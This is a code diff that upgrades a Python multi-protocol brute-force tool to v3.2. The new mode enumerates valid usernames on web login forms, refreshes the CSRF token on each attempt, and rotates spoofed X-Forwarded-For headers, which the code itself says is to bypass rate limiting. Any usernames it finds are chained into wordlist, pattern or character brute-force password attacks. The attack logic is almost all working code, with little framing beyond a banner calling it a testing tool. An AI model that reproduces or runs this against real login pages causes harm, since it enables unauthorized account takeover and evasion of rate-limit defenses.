@@ -102,9 +102,9 @@ def load_userlist(filepath):
 def print_banner():
     print(colored("""
 ╔═══════════════════════════════════════════════════╗
-║         SCYFIX BRUTE FORCER v3.1                  ║
+║         SCYFIX BRUTE FORCER v3.2                  ║
 ║   Multi-Protocol Authentication Testing Tool      ║
-║   Web | SSH | FTP | CSRF | Username Wordlists     ║
+║   Web | SSH | FTP | CSRF | Username Enum          ║
 ╚═══════════════════════════════════════════════════╝
 """, 'cyan'))
 
@@ -204,18 +204,26 @@ def identify_fields(fields, submit_fields):
 
 
 def web_attempt_login(url, session, method, action, fields, username_field,
-                      password_field, username, password, fail_string, delay, csrf_field):
+                      password_field, username, password, fail_string, delay, csrf_field,
+                      xff_ip=None):
     if csrf_field:
         fresh_token = get_fresh_token(url, session, csrf_field)
         if fresh_token:
             fields[csrf_field] = fresh_token
     fields[username_field] = username
     fields[password_field] = password
+
+    headers = {}
+    if xff_ip:
+        headers['X-Forwarded-For'] = xff_ip
+
     try:
         if method == 'post':
-            response = session.post(action, data=fields, timeout=10, allow_redirects=True)
+            response = session.post(action, data=fields, timeout=10,
+                                    allow_redirects=True, headers=headers)
         else:
-            response = session.get(action, params=fields, timeout=10, allow_redirects=True)
+            response = session.get(action, params=fields, timeout=10,
+                                   allow_redirects=True, headers=headers)
         time.sleep(delay)
         return fail_string not in response.text
     except requests.exceptions.ConnectionError:
@@ -359,6 +367,109 @@ def detect_protocol(host, port):
 
 
 # ════════════════════════════════════════════════════════════════
+#  USERNAME ENUMERATION (MODE 8)
+# ════════════════════════════════════════════════════════════════
+
+def username_enum(url, username_file, fail_string, password, delay, use_xff):
+    """
+    Iterates a username wordlist with a fixed password.
+    Detects valid usernames by checking if the fail_string is ABSENT from the response.
+    Supports X-Forwarded-For IP rotation to bypass rate limiting.
+    """
+    print(colored("\n[*] Starting username enumeration...", 'cyan'))
+
+    try:
+        with open(username_file, 'r', encoding='utf-8', errors='ignore') as f:
+            usernames = [line.strip() for line in f if line.strip()]
+    except FileNotFoundError:
+        print(colored(f"[-] Username file not found: {username_file}", 'red'))
+        return []
+
+    total = len(usernames)
+    print(colored(f"[*] Loaded {total} usernames from wordlist", 'cyan'))
+    print(colored(f"[*] Fixed password: {password}", 'cyan'))
+    if use_xff:
+        print(colored("[*] X-Forwarded-For rotation: ENABLED", 'yellow'))
+    else:
+        print(colored("[*] X-Forwarded-For rotation: disabled", 'cyan'))
+
+    session = requests.Session()
+    session.headers.update({
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+    })
+    session.get(url, timeout=10)
+
+    method, action, all_fields, _ = detect_form(url, session)
+    if not method:
+        print(colored("[-] Could not detect form -- exiting", 'red'))
+        return []
+
+    submit_field_names = ['login', 'submit', 'signin', 'btn', 'button']
+    submit_fields = {k: v for k, v in all_fields.items() if k.lower() in submit_field_names}
+    input_fields = {k: v for k, v in all_fields.items() if k.lower() not in submit_field_names}
+
+    username_field, password_field = identify_fields(input_fields, submit_fields)
+    csrf_field = detect_csrf_field(input_fields)
+
+    print(colored(f"\n[*] Enumeration started at {datetime.now().strftime('%H:%M:%S')}", 'cyan'))
+    print(colored("=" * 55, 'cyan'))
+
+    valid_usernames = []
+
+    for count, username in enumerate(usernames, 1):
+        xff_ip = f"10.{(count // 65025) % 256}.{(count // 255) % 256}.{count % 255}" if use_xff else None
+
+        if csrf_field:
+            fresh_token = get_fresh_token(url, session, csrf_field)
+            if fresh_token:
+                all_fields[csrf_field] = fresh_token
+
+        all_fields[username_field] = username
+        all_fields[password_field] = password
+
+        headers = {}
+        if xff_ip:
+            headers['X-Forwarded-For'] = xff_ip
+
+        sys.stdout.write(colored(
+            f"\r  [*] Trying ({count}/{total}): {username:<30}", 'red'
+        ))
+        sys.stdout.flush()
+
+        try:
+            if method == 'post':
+                response = session.post(action, data=all_fields.copy(), timeout=10,
+                                        allow_redirects=True, headers=headers)
+            else:
+                response = session.get(action, params=all_fields.copy(), timeout=10,
+                                       allow_redirects=True, headers=headers)
+            time.sleep(delay)
+
+            if fail_string not in response.text:
+                print(colored(f"\n  [!] VALID USERNAME FOUND: {username}", 'green'))
+                valid_usernames.append(username)
+
+        except requests.exceptions.ConnectionError:
+            print(colored("\n[!] Connection error -- sleeping 5s", 'red'))
+            time.sleep(5)
+        except requests.exceptions.Timeout:
+            pass
+
+    print(colored(f"\n\n[*] Enumeration complete at {datetime.now().strftime('%H:%M:%S')}", 'cyan'))
+
+    if valid_usernames:
+        print(colored(f"\n[+] Valid usernames found: {valid_usernames}", 'green'))
+
+        chain = input(colored("\n[*] Chain into password attack on found usernames? (y/n): ", 'cyan')).strip().lower()
+        if chain == 'y':
+            return valid_usernames
+    else:
+        print(colored("[-] No valid usernames found", 'red'))
+
+    return valid_usernames
+
+
+# ════════════════════════════════════════════════════════════════
 #  WEB ATTACK RUNNER
 # ════════════════════════════════════════════════════════════════
 
@@ -477,7 +588,8 @@ def main():
     print(colored("  5. SSH brute force", 'white'))
     print(colored("  6. FTP brute force", 'white'))
     print(colored("  7. Auto-detect protocol (SSH/FTP)", 'white'))
-    mode = input(colored("\n[*] Enter mode (1-7): ", 'cyan'))
+    print(colored("  8. Username enumeration (web)", 'white'))
+    mode = input(colored("\n[*] Enter mode (1-8): ", 'cyan'))
 
     if mode in ['1', '2', '3', '4']:
         url = input(colored("[*] Enter target login URL: ", 'cyan'))
@@ -523,6 +635,36 @@ def main():
             ssh_attack(host, port, usernames, password_file, delay)
         elif protocol == 'ftp':
             ftp_attack(host, port, usernames, password_file, delay)
+
+    elif mode == '8':
+        url = input(colored("[*] Enter target login URL: ", 'cyan'))
+        username_file = input(colored("[*] Enter path to username wordlist: ", 'cyan')).strip()
+        fail_string = input(colored("[*] Enter string that appears when login FAILS: ", 'cyan'))
+        password = input(colored("[*] Enter fixed password to use (default: password): ", 'cyan')).strip()
+        if not password:
+            password = 'password'
+        delay = input(colored("[*] Delay between attempts (default 0.5): ", 'cyan'))
+        delay = float(delay) if delay.strip() else 0.5
+        xff = input(colored("[*] Enable X-Forwarded-For IP rotation to bypass rate limiting? (y/n): ", 'cyan')).strip().lower()
+        use_xff = xff == 'y'
+
+        valid_usernames = username_enum(url, username_file, fail_string, password, delay, use_xff)
+
+        if valid_usernames:
+            chain = input(colored("\n[*] Run password attack on found usernames now? (y/n): ", 'cyan')).strip().lower()
+            if chain == 'y':
+                fail_string2 = input(colored("[*] Fail string for password attack (ENTER to reuse same): ", 'cyan')).strip()
+                if not fail_string2:
+                    fail_string2 = fail_string
+                delay2 = input(colored("[*] Delay for password attack (default 0.5): ", 'cyan'))
+                delay2 = float(delay2) if delay2.strip() else 0.5
+                print(colored("\n[*] Select password attack mode:", 'cyan'))
+                print(colored("  1. Wordlist attack", 'white'))
+                print(colored("  2. Pattern attack", 'white'))
+                print(colored("  3. Character brute force", 'white'))
+                print(colored("  4. All modes", 'white'))
+                pw_mode = input(colored("[*] Enter mode (1-4): ", 'cyan'))
+                run_web_attack(pw_mode, url, valid_usernames, fail_string2, delay2)
 
     else:
         print(colored("[-] Invalid mode selected", 'red'))
